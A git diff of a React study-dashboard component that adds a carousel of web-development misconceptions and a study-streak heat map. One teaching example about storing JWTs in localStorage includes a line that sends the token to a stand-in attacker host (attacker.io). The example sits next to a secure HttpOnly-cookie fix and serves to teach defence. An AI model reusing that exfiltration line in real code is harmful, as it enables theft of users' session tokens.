@@ -2,7 +2,7 @@ import React, { useState } from 'react';
 import { 
   Sparkles, Layers, BookOpen, FileText, HelpCircle, ArrowRight, CheckCircle2, AlertCircle,
   GraduationCap, Coffee, Code, Database, ChevronRight, PlayCircle, Download, Upload, ShieldAlert,
-  Trash2, Plus, X
+  Trash2, Plus, X, ThumbsUp, Check, XCircle, Flame, Zap, RotateCcw, Info
 } from 'lucide-react';
 import { DatabaseState, Topic, Subtopic } from '../types';
 
@@ -14,12 +14,154 @@ interface DashboardProps {
   onTriggerNewTopic: () => void;
 }
 
+interface MisconceptionItem {
+  id: number;
+  category: string;
+  theme: 'javascript' | 'mern' | 'deployment' | 'database';
+  title: string;
+  myth: string;
+  explanation: string;
+  wrongCodeTitle: string;
+  wrongCode: string;
+  rightCodeTitle: string;
+  rightCode: string;
+  takeaway: string;
+}
+
+const DEVELOPER_MISCONCEPTIONS: MisconceptionItem[] = [
+  {
+    id: 1,
+    category: "🛡️ XSS Security Hole",
+    theme: "mern",
+    title: "The LocalStorage JWT Storage Anti-Pattern",
+    myth: "Saving authentication JWTs directly in localStorage is perfectly safe because only my site domain can read it.",
+    explanation: "Any third-party script, malicious npm library, or unvetted Google Tag Manager container running on your page has access to window's raw localStorage. If an XSS vulnerability exists, attackers can scrape everyone's tokens instantly! Instead, restrict script capabilities by returning HttpOnly, Secure cookie lines from your Node server.",
+    wrongCodeTitle: "❌ VULNERABLE APPROACH (localStorage)",
+    wrongCode: `// Client-Side Login Success Handler
+localStorage.setItem('auth_token', response.data.token);
+// Potential XSS script:
+const stl = localStorage.getItem('auth_token');
+fetch('https://attacker.io/steal?key=' + stl); // Token stolen!`,
+    rightCodeTitle: "✅ CRYPTOGRAPHICALLY SECURE WAY (HttpOnly Cookies)",
+    rightCode: `// Server-Side Express Login Response
+res.cookie('auth_token', token, {
+  httpOnly: true, // ⚠️ Completely invisible to client-side JS scripts!
+  secure: true,   // Sent ONLY over HTTPS connections
+  sameSite: 'strict'
+});`,
+    takeaway: "Never trust raw browser memory with authorization secrets. Process tokens server-side using secure HttpOnly cookies."
+  },
+  {
+    id: 2,
+    category: "🧠 React Optimization Loop",
+    theme: "javascript",
+    title: "Evaluating Objects/Functions in Dependency Lists",
+    myth: "React knows when structural configurations change, so I should just pass helper functions or configuration options objects straight into useEffect.",
+    explanation: "React relies on strict reference equality (Object.is) for dependencies checks. Object literals or custom arrow functions get redeclared and allocated a separate memory hash on every single render. Putting them inside a dependency list tricks React into firing your side-effect continuously, causing extreme lag and API overloads.",
+    wrongCodeTitle: "❌ WATERFALL RERENDER FLICKER",
+    wrongCode: `function MainSearchPanel() {
+  const options = { limit: 10, offset: 0 }; // Recreated on EVERY render
+
+  useEffect(() => {
+    fetchApiData(options);
+  }, [options]); // ❌ Infinite Render Loop Triggered!
+}`,
+    rightCodeTitle: "✅ CONSOLIDATED PRIMITIVES ARRAY",
+    rightCode: `function MainSearchPanel() {
+  const [limit] = useState(10);
+  const [offset] = useState(0);
+
+  useEffect(() => {
+    fetchApiData({ limit, offset });
+  }, [limit, offset]); // ✅ Fires ONLY if numeric values change
+}`,
+    takeaway: "Either keep dependencies as static primitive scalars (strings, numbers) or wrap complex targets with useMemo / useCallback."
+  },
+  {
+    id: 3,
+    category: "💥 React Immutability Rule",
+    theme: "javascript",
+    title: "Direct Mutation of Reference State Variables",
+    myth: "As long as I trigger my state setter afterwards, React doesn't mind if I update arrays or object properties directly.",
+    explanation: "React uses strict reference checks to see if state actually changed. If you mutate values in-place, the memory address of the object remains identical (identity preservation). React assumes nothing changed and skips updating the virtual DOM entirely!",
+    wrongCodeTitle: "❌ GHOST STATE MUTATION (No render occurs)",
+    wrongCode: `const [list, setList] = useState(['Concept A', 'Concept B']);
+
+const handleAdd = (item) => {
+  list.push(item); // Direct array modification
+  setList(list);   // React sees identical reference array; skips rendering!
+};`,
+    rightCodeTitle: "✅ NOVEL RESOLVED SHAPE ALLOCATION",
+    rightCode: `const [list, setList] = useState(['Concept A', 'Concept B']);
+
+const handleAdd = (item) => {
+  setList(prev => [...prev, item]); // ✅ Spread pattern forces novel instance hash!
+};`,
+    takeaway: "Treat state objects as completely immutable, cold-storage blocks. Always allocate fresh instances (via spread / map / filter)."
+  },
+  {
+    id: 4,
+    category: "⚡ Async Pipeline Acceleration",
+    theme: "javascript",
+    title: "Sequential Blocking Waterfall Queries",
+    myth: "Using async/await guarantees parallel processing since node-concurrency allows non-blocking calls.",
+    explanation: "If you stack three await lines consecutively, Node blocks execution of each line until the previous one yields its response. Your network requests run sequentially, resulting in an additive lag of all network durations. Run requests concurrently with Promise.all for a major speedup.",
+    wrongCodeTitle: "❌ BLOCKING WATERFALL PIPELINE (Slow!)",
+    wrongCode: `// Each await acts as a sequential gate
+const user = await fetchUser();       // Takes 300ms
+const posts = await fetchPosts();     // Takes 400ms (Total = 700ms)
+const ads = await fetchCampaigns();   // Takes 250ms (Total = 950ms)
+renderDashboard(user, posts, ads);`,
+    rightCodeTitle: "✅ CONCURRENT OVERLAPPED EXECUTION (Fast!)",
+    rightCode: `// Trigger all requests concurrently first
+const [user, posts, ads] = await Promise.all([
+  fetchUser(),
+  fetchPosts(),
+  fetchCampaigns()
+]); // Runs collectively in maximum-duration overlap: ~400ms total! ✅`,
+    takeaway: "Never serialize independent queries. Fire them in parallel with Promise.all to minimize latency."
+  },
+  {
+    id: 5,
+    category: "☁️ Serverless & Database Health",
+    theme: "database",
+    title: "Uncontrolled Database Connection Re-Instantiations",
+    myth: "I should boot my MongoDB/Postgres database adapter in my serverless endpoint's route listener so it only opens when someone requests it.",
+    explanation: "On serverless environments (or standard high-frequency active endpoints), booting connection clients INSIDE route handlers allocates a brand new connection socket array on every trigger invocation. Your database's socket pool will immediately choke and throw 'too many connections' errors. Reuse connections globally.",
+    wrongCodeTitle: "❌ POOL CONGESTION ENGINE (Server crashes under load)",
+    wrongCode: `// Express Route Handler
+app.get('/api/users', async (req, res) => {
+  const client = new MongoClient(process.env.MONGO_URI);
+  await client.connect(); // Opens connection pool from scratch ON EVERY CALL!
+  const users = await client.db().collection('users').find().toArray();
+  res.json(users);
+});`,
+    rightCodeTitle: "✅ GLOBAL CACHED ADAPTER HOISTING",
+    rightCode: `// Initialize AND cache the client OUTSIDE the handler block!
+let cachedClient = null;
+
+async function connectToDb() {
+  if (!cachedClient) {
+    cachedClient = await MongoClient.connect(process.env.MONGO_URI);
+  }
+  return cachedClient;
+} // Shared/reused across concurrent requests ✅`,
+    takeaway: "Always initialize database client instances outside of the request-response callback scope to cache connection pools."
+  }
+];
+
 export function Dashboard({ dbState, onSelectView, onOpenSubtopic, onUpdateDb, onTriggerNewTopic }: DashboardProps) {
   const { topics, subtopics, pdfs, notes, videos, concepts, coding, interviews, quizzes } = dbState;
   
   // Feedback states for importing data
   const [successMsg, setSuccessMsg] = useState<string | null>(null);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
+
+  // Tech Unlearning & Anti-Pattern Buster Hub State
+  const [currentMythIdx, setCurrentMythIdx] = useState(0);
+  const [revealMythSol, setRevealMythSol] = useState(false);
+  const [mindBlownCount, setMindBlownCount] = useState<Record<number, boolean>>({});
+  const [mythsLearnedTotal, setMythsLearnedTotal] = useState(0);
 
   // Calculate totals
   const totalTopicsCount = topics.length;
@@ -131,6 +273,8 @@ export function Dashboard({ dbState, onSelectView, onOpenSubtopic, onUpdateDb, o
               trackers: Array.isArray(parsed.trackers) ? parsed.trackers : [],
               vaultItems: Array.isArray(parsed.vaultItems) ? parsed.vaultItems : [],
               vaultCategories: Array.isArray(parsed.vaultCategories) ? parsed.vaultCategories : [],
+              assignments: Array.isArray(parsed.assignments) ? parsed.assignments : [],
+              todos: Array.isArray(parsed.todos) ? parsed.todos : [],
             };
             
             // Validate at least some keys are set
@@ -161,17 +305,358 @@ export function Dashboard({ dbState, onSelectView, onOpenSubtopic, onUpdateDb, o
   return (
     <div className="space-y-8 animate-in fade-in slide-in-from-bottom-2 duration-200">
       
-      {/* Header section */}
-      <div>
-        <p className="text-xs font-bold text-slate-400 dark:text-slate-500 uppercase tracking-widest font-mono">
-          Today
-        </p>
-        <h2 className="text-4xl font-extrabold text-slate-900 dark:text-white mt-1 tracking-tight">
-          What to study next.
-        </h2>
-        <p className="text-sm font-medium text-slate-500 dark:text-slate-400 mt-2 font-sans">
-          One quiet place for everything you’re learning.
-        </p>
+      {/* 1. Header Section */}
+      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 border-b border-slate-200 dark:border-slate-800 pb-5">
+        <div className="text-left">
+          <p className="text-[10px] font-black text-amber-500 uppercase tracking-widest font-mono">
+            Active Study Portal
+          </p>
+          <h2 className="text-3xl font-extrabold text-slate-900 dark:text-white mt-1 tracking-tight font-sans">
+            Neural Learning Matrix
+          </h2>
+          <p className="text-xs text-slate-500 dark:text-slate-400 mt-1 font-sans">
+            One high-retention environment to track, review, and consolidate your engineering competencies.
+          </p>
+        </div>
+
+        <div className="flex items-center gap-2">
+          <button
+            onClick={onTriggerNewTopic}
+            className="px-4 py-2 border border-slate-200 dark:border-slate-800 bg-white dark:bg-slate-900 hover:bg-slate-50 dark:hover:bg-slate-850 text-slate-650 dark:text-slate-300 text-xs font-bold rounded-xl transition-all cursor-pointer font-mono shadow-3xs"
+          >
+            + NEW TOPIC
+          </button>
+        </div>
+      </div>
+
+      {/* 2. Top Bento row (Streak Engine + Development Insights) */}
+      <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
+        
+        {/* Daily Study Streak & Neural Heat Map */}
+        <div className="xl:col-span-12 lg:xl:col-span-5 bg-white dark:bg-slate-900/65 border border-slate-200 dark:border-slate-800 p-6 rounded-3xl shadow-3xs text-left relative overflow-hidden flex flex-col justify-between space-y-6">
+          <div className="space-y-4">
+            <div className="flex items-center justify-between gap-2">
+              <span className="text-[10px] font-bold text-amber-500 bg-amber-500/10 border border-amber-500/20 px-2 py-0.5 rounded-md font-mono tracking-wide uppercase flex items-center gap-1">
+                <Flame className="w-3.5 h-3.5 fill-amber-500 text-amber-500 animate-pulse" />
+                Neural Habit Grid
+              </span>
+
+              <span className="text-[9px] font-mono text-slate-400 font-bold">
+                WEEKLY CYCLE
+              </span>
+            </div>
+
+            {/* Streak Hero Title */}
+            <div>
+              {(() => {
+                const streak = dbState.streak || { count: 0, lastActiveDate: "" };
+                const streakCount = streak.count || 0;
+                
+                const todayStrStr = (() => {
+                  const d = new Date();
+                  const year = d.getFullYear();
+                  const month = String(d.getMonth() + 1).padStart(2, '0');
+                  const day = String(d.getDate()).padStart(2, '0');
+                  return `${year}-${month}-${day}`;
+                })();
+                const completedTodayStr = streak.lastActiveDate === todayStrStr;
+
+                const progressPercent = streakCount === 0 ? 0 : Math.min(100, Math.round(((streakCount % 7) || 7) / 7 * 100));
+
+                const habitDays = Array.from({ length: 14 }).map((_, i) => {
+                  const dOffset = 13 - i; // from 13 days ago to 0 (today)
+                  const d = new Date();
+                  d.setDate(d.getDate() - dOffset);
+                  const dayNum = String(d.getDate());
+                  const monthNum = String(d.getMonth() + 1);
+                  const formattedDate = `${monthNum}/${dayNum}`;
+                  
+                  // If we have S days of streak, light up the last S days
+                  const isActive = streakCount > 0 && dOffset < streakCount;
+                  const isToday = dOffset === 0;
+
+                  return {
+                    dOffset,
+                    formattedDate,
+                    isActive,
+                    isToday,
+                    dayName: d.toLocaleDateString([], { weekday: 'short' }),
+                  };
+                });
+
+                return (
+                  <div className="space-y-5">
+                    <div>
+                      <div className="flex items-baseline gap-2">
+                        <span className="text-3xl font-black text-slate-900 dark:text-white font-mono tracking-tight text-amber-550 dark:text-amber-400">
+                          {streakCount} {streakCount === 1 ? 'Day' : 'Days'}
+                        </span>
+                        <span className="text-xs font-bold text-amber-500 dark:text-amber-400 uppercase tracking-wider font-sans">
+                          Habit Streak
+                        </span>
+                      </div>
+                      <p className="text-xs text-slate-500 dark:text-slate-400 mt-1 font-sans leading-relaxed">
+                        {completedTodayStr 
+                          ? "✨ Study actions completed today! Great job maintaining your memory retention." 
+                          : "⏳ Complete a task or study commitment today to keep your fire burning!"
+                        }
+                      </p>
+                    </div>
+
+                    {/* Subtle Progress Bar */}
+                    <div className="space-y-1.5">
+                      <div className="flex items-center justify-between text-[10px] font-sans font-bold">
+                        <span className="text-slate-700 dark:text-slate-300">
+                          {streakCount === 0 ? 'Spark Inactive' : `Milestone Tier ${Math.floor(streakCount / 7) + 1}`}
+                        </span>
+                        <span className="font-mono text-amber-600 dark:text-amber-400 font-bold">
+                          {(streakCount % 7) || (streakCount > 0 ? 7 : 0)} / 7 Days
+                        </span>
+                      </div>
+                      
+                      <div className="w-full bg-slate-100 dark:bg-slate-800/80 rounded-full h-2 overflow-hidden relative border border-slate-200 dark:border-slate-850/50">
+                        <div 
+                          className="bg-gradient-to-r from-amber-500 to-orange-500 h-full rounded-full transition-all duration-300"
+                          style={{ width: `${progressPercent}%` }}
+                        />
+                      </div>
+                      
+                      <p className="text-[10px] italic text-slate-400 font-sans leading-tight">
+                        {streakCount === 0 
+                          ? "💡 Procrastination Buster tip: Create 1 small 15-minute study target to kickstart study habits." 
+                          : `🏆 Consistent Study! Keep it up: ${7 - ((streakCount % 7) || 0)} more active days until the next neural reward tier.`
+                        }
+                      </p>
+                    </div>
+
+                    {/* 14-day Habit Heat Map Grid */}
+                    <div className="space-y-2 pt-2 border-t border-slate-100 dark:border-slate-850/60">
+                      <p className="text-[10px] font-mono font-extrabold text-slate-400 dark:text-slate-500 uppercase tracking-widest leading-none mb-2">
+                        14-Day Micro-Activity Grid
+                      </p>
+                      
+                      <div className="grid grid-cols-7 gap-2">
+                        {habitDays.map(day => (
+                          <div 
+                            key={day.dOffset}
+                            className={`aspect-square rounded-lg flex flex-col items-center justify-center relative group cursor-pointer border ${
+                              day.isActive
+                                ? 'bg-gradient-to-br from-amber-400 to-orange-500 border-amber-300 dark:border-orange-500/30 text-slate-900 dark:text-slate-950 font-extrabold shadow-3xs'
+                                : day.isToday
+                                  ? 'bg-slate-550/10 dark:bg-slate-950 border-2 border-dashed border-amber-500/50 text-slate-450 font-bold'
+                                  : 'bg-slate-50/70 dark:bg-slate-950/40 border-slate-200 dark:border-slate-850 hover:bg-slate-100 dark:hover:bg-slate-850 text-slate-400'
+                            }`}
+                          >
+                            <span className="text-[9px] font-mono leading-none">
+                              {day.dayName.charAt(0)}
+                            </span>
+                            <span className="text-[7.5px] font-mono mt-0.5 opacity-75">
+                              {day.formattedDate}
+                            </span>
+
+                            {/* Hover tooltip for positive reinforcement */}
+                            <div className="absolute bottom-full left-1/2 -translate-x-1/2 mb-1.5 hidden group-hover:block z-50 bg-slate-950 dark:bg-slate-100 text-slate-100 dark:text-slate-900 text-[10px] px-2.5 py-1 rounded-lg shadow-lg pointer-events-none whitespace-nowrap font-sans font-bold">
+                              {day.isToday ? 'Today' : `${day.formattedDate}`} — {day.isActive ? '🔥 Study Loop Active!' : '⏳ No Activity Logged'}
+                            </div>
+                          </div>
+                        ))}
+                      </div>
+
+                      <div className="flex items-center justify-between text-[9px] text-slate-400 font-mono font-medium pt-1.5 leading-none">
+                        <span>13 days ago</span>
+                        <span className="flex items-center gap-1.5 font-sans font-medium text-[8.5px]">
+                          <span className="w-1.5 h-1.5 rounded-sm bg-slate-100 dark:bg-slate-950 border border-slate-250 dark:border-slate-800 shadow-3xs" />
+                          <span>Rest</span>
+                          <span className="w-1.5 h-1.5 rounded-sm bg-gradient-to-br from-amber-400 to-orange-550 shadow-3xs" />
+                          <span>Active Learning</span>
+                        </span>
+                        <span>Today</span>
+                      </div>
+                    </div>
+
+                  </div>
+                );
+              })()}
+            </div>
+          </div>
+        </div>
+
+        {/* Daily Development Insights Card */}
+        <div className="xl:col-span-12 lg:xl:col-span-7 bg-slate-900 text-slate-100 border border-slate-800 p-6 rounded-3xl shadow-lg text-left relative overflow-hidden flex flex-col justify-between min-h-[352px]">
+          
+          {/* Aesthetic mock code terminal indicators */}
+          <div className="absolute right-4 top-4 flex items-center gap-1.5 select-none opacity-20">
+            <span className="w-2.1 h-2.1 rounded-full bg-red-500" />
+            <span className="w-2.1 h-2.1 rounded-full bg-yellow-500" />
+            <span className="w-2.1 h-2.1 rounded-full bg-green-500" />
+          </div>
+
+          <div className="space-y-4">
+            
+            {/* Upper row header */}
+            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800/80 pb-3">
+              <div>
+                <div className="flex items-center gap-2">
+                  <span className="text-[9px] font-black tracking-widest uppercase font-mono bg-blue-500/10 text-blue-400 border border-blue-500/20 px-2 py-0.5 rounded">
+                    Daily Dev Insights
+                  </span>
+                  <span className="text-[9px] font-mono text-slate-400">
+                    ⚡ Mental model booster
+                  </span>
+                </div>
+                <h3 className="text-lg font-extrabold text-white mt-1 font-sans tracking-tight leading-none">
+                  Curated Developer Tip of the Day
+                </h3>
+              </div>
+
+              {/* Mastery tracking badges */}
+              <div className="flex items-center gap-2">
+                <span className="px-2.5 py-1 bg-slate-850 text-slate-300 text-[10px] font-mono font-bold rounded-lg border border-slate-800">
+                  🏆 {mythsLearnedTotal} / {DEVELOPER_MISCONCEPTIONS.length} Mastery
+                </span>
+              </div>
+            </div>
+
+            {/* Carousel navigation toolbar */}
+            {(() => {
+              const currentInsight = DEVELOPER_MISCONCEPTIONS[currentMythIdx];
+              const isMastered = !!mindBlownCount[currentInsight.id];
+
+              return (
+                <div className="space-y-4">
+                  <div className="flex items-center justify-between gap-4">
+                    <span className="text-[10px] font-black font-mono text-teal-400 uppercase tracking-widest px-2.5 py-1 bg-teal-500/5 rounded-md border border-teal-500/10">
+                      🚀 {currentInsight.category.toUpperCase()}
+                    </span>
+
+                    <div className="flex items-center gap-1">
+                      <button
+                        onClick={() => {
+                          setRevealMythSol(false);
+                          setCurrentMythIdx((prev) => (prev - 1 + DEVELOPER_MISCONCEPTIONS.length) % DEVELOPER_MISCONCEPTIONS.length);
+                        }}
+                        className="px-2.5 py-1 text-[11px] font-mono font-bold text-slate-400 hover:text-white hover:bg-slate-800 rounded-lg transition-colors cursor-pointer text-xs"
+                      >
+                        ◀ Prev
+                      </button>
+                      <span className="text-xs text-slate-500 font-mono">
+                        {currentMythIdx + 1} of {DEVELOPER_MISCONCEPTIONS.length}
+                      </span>
+                      <button
+                        onClick={() => {
+                          setRevealMythSol(false);
+                          setCurrentMythIdx((prev) => (prev + 1) % DEVELOPER_MISCONCEPTIONS.length);
+                        }}
+                        className="px-2.5 py-1 text-[11px] font-mono font-bold text-slate-400 hover:text-white hover:bg-slate-800 rounded-lg transition-colors cursor-pointer text-xs"
+                      >
+                        Next ▶
+                      </button>
+                    </div>
+                  </div>
+
+                  {/* Inspected Item Panel */}
+                  <div className="space-y-3">
+                    <h4 className="text-md sm:text-lg font-extrabold text-slate-100 font-sans tracking-tight leading-snug">
+                      "{currentInsight.title}"
+                    </h4>
+
+                    <div className="p-4 rounded-2xl border border-rose-500/15 bg-rose-500/[0.02] text-xs text-rose-300 leading-relaxed font-sans">
+                      <span className="font-mono text-[9px] font-black text-rose-400 block tracking-wider uppercase mb-1">
+                        🚫 THE POPULAR MYTH / BEGINNER MISTAKE:
+                      </span>
+                      <span>{currentInsight.myth}</span>
+                    </div>
+                  </div>
+
+                  {/* Soul Solution details layout */}
+                  <div className="mt-4 pt-1 border-t border-slate-850">
+                    {!revealMythSol ? (
+                      <div className="text-center py-2">
+                        <button
+                          onClick={() => setRevealMythSol(true)}
+                          className="px-5 py-3 rounded-xl bg-orange-600 hover:bg-orange-500 text-white font-extrabold text-xs uppercase tracking-wider transition-all shadow-md flex items-center gap-2 mx-auto cursor-pointer font-sans"
+                        >
+                          <Zap className="w-4 h-4 text-yellow-300" />
+                          <span>Reveal Elite Coding Solution ➔</span>
+                        </button>
+                      </div>
+                    ) : (
+                      <div className="space-y-4 animate-in zoom-in-98 duration-100">
+                        <div className="p-4 rounded-xl border border-slate-800 bg-slate-950/70 text-xs text-slate-300 leading-relaxed font-sans">
+                          <span className="font-mono text-[9px] font-black text-orange-400 block tracking-wider uppercase mb-1 flex items-center gap-1.5">
+                            <Info className="w-3.5 h-3.5 text-orange-450" />
+                            THE COGNITIVE TRUTH DEBUNKED
+                          </span>
+                          <span>{currentInsight.explanation}</span>
+                        </div>
+
+                        {/* Left/Right comparative panel */}
+                        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
+                          <div className="rounded-xl border border-red-950/40 bg-red-950/20 p-3.5 text-left font-mono">
+                            <span className="text-[8.5px] font-black text-rose-455 uppercase tracking-widest block pb-1 border-b border-red-950/50">
+                              {currentInsight.wrongCodeTitle}
+                            </span>
+                            <pre className="text-[10.5px] overflow-x-auto text-rose-200 mt-2 font-mono scrollbar-thin max-y-36">
+                              <code>{currentInsight.wrongCode}</code>
+                            </pre>
+                          </div>
+
+                          <div className="rounded-xl border border-emerald-950/40 bg-emerald-950/20 p-3.5 text-left font-mono">
+                            <span className="text-[8.5px] font-black text-emerald-455 tracking-widest uppercase block pb-1 border-b border-emerald-950/50">
+                              {currentInsight.rightCodeTitle}
+                            </span>
+                            <pre className="text-[10.5px] overflow-x-auto text-emerald-200 mt-2 font-mono scrollbar-thin max-y-36">
+                              <code>{currentInsight.rightCode}</code>
+                            </pre>
+                          </div>
+                        </div>
+
+                        {/* Golden takeaway */}
+                        <div className="p-3 bg-emerald-500/5 rounded-xl border border-emerald-500/10 text-xs text-emerald-350 flex items-center gap-2.5 text-left">
+                          <span className="p-1 rounded bg-emerald-500/15 shrink-0 text-emerald-400">
+                            <Check className="w-4 h-4" />
+                          </span>
+                          <p className="font-sans text-[11px] font-medium leading-relaxed">
+                            <strong className="font-mono font-black uppercase text-[10px] text-emerald-400 block sm:inline mr-1">GOLDEN TRUTH TAKEAWAY:</strong> {currentInsight.takeaway}
+                          </p>
+                        </div>
+
+                        <div className="flex flex-col sm:flex-row items-center justify-between gap-3 pt-2">
+                          <p className="text-[9.5px] text-slate-500 italic font-sans">
+                            💡 Build deep structural mastery by discarding brittle coding practices.
+                          </p>
+
+                          <button
+                            onClick={() => {
+                              if (!isMastered) {
+                                setMindBlownCount((prev) => ({ ...prev, [currentInsight.id]: true }));
+                                setMythsLearnedTotal((prev) => prev + 1);
+                              } else {
+                                setMindBlownCount((prev) => ({ ...prev, [currentInsight.id]: false }));
+                                setMythsLearnedTotal((prev) => Math.max(0, prev - 1));
+                              }
+                            }}
+                            className={`px-4 py-2 rounded-xl text-[10px] font-bold font-mono tracking-wide uppercase transition-all select-none cursor-pointer flex items-center gap-2 ${
+                              isMastered
+                                ? 'bg-emerald-600 text-white shadow-2xs'
+                                : 'bg-slate-800 hover:bg-slate-755 text-slate-350 hover:text-white border border-slate-700'
+                            }`}
+                          >
+                            <ThumbsUp className={`w-3.5 h-3.5 ${isMastered ? 'fill-white' : ''}`} />
+                            <span>{isMastered ? '🎉 INSIGHT MASTERED!' : '😮 REINFORCE MODEL'}</span>
+                          </button>
+                        </div>
+                      </div>
+                    )}
+                  </div>
+
+                </div>
+              );
+            })()}
+
+          </div>
+
+        </div>
       </div>
 
       {/* Recommended study module (Screen 1 large card) */}
@@ -239,12 +724,15 @@ export function Dashboard({ dbState, onSelectView, onOpenSubtopic, onUpdateDb, o
       <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
         
         {/* Topics Count */}
-        <div className="bg-white dark:bg-slate-900/60 rounded-2xl border border-slate-200 dark:border-slate-800 p-5 flex items-center gap-4 shadow-sm hover:shadow transition-shadow">
+        <div 
+          onClick={() => onSelectView('topicshelf')}
+          className="bg-white dark:bg-slate-900/60 rounded-2xl border border-slate-200 dark:border-slate-800 p-5 flex items-center gap-4 shadow-sm hover:shadow hover:border-blue-500/40 cursor-pointer transition-all"
+        >
           <div className="w-12 h-12 rounded-xl bg-blue-50 dark:bg-blue-950/20 text-blue-600 flex items-center justify-center shrink-0">
             <BookOpen className="w-5.5 h-5.5" />
           </div>
           <div>
-            <p className="text-3xl font-extrabold tracking-tight text-slate-900 dark:text-white leading-none">
+            <p className="text-3xl font-extrabold tracking-tight text-slate-900 dark:text-white leading-none font-mono">
               {totalTopicsCount}
             </p>
             <p className="text-[10px] font-extrabold font-mono tracking-wider text-slate-400 dark:text-slate-500 uppercase mt-2">
@@ -254,12 +742,15 @@ export function Dashboard({ dbState, onSelectView, onOpenSubtopic, onUpdateDb, o
         </div>
 
         {/* Subtopics Count */}
-        <div className="bg-white dark:bg-slate-900/60 rounded-2xl border border-slate-200 dark:border-slate-800 p-5 flex items-center gap-4 shadow-sm hover:shadow transition-shadow">
+        <div 
+          onClick={() => onSelectView('topicshelf')}
+          className="bg-white dark:bg-slate-900/60 rounded-2xl border border-slate-200 dark:border-slate-800 p-5 flex items-center gap-4 shadow-sm hover:shadow hover:border-blue-500/40 cursor-pointer transition-all"
+        >
           <div className="w-12 h-12 rounded-xl bg-indigo-50 dark:bg-indigo-950/20 text-indigo-600 flex items-center justify-center shrink-0">
             <Layers className="w-5.5 h-5.5" />
           </div>
           <div>
-            <p className="text-3xl font-extrabold tracking-tight text-slate-900 dark:text-white leading-none">
+            <p className="text-3xl font-extrabold tracking-tight text-slate-900 dark:text-white leading-none font-mono">
               {totalSubtopicsCount}
             </p>
             <p className="text-[10px] font-extrabold font-mono tracking-wider text-slate-400 dark:text-slate-500 uppercase mt-2">
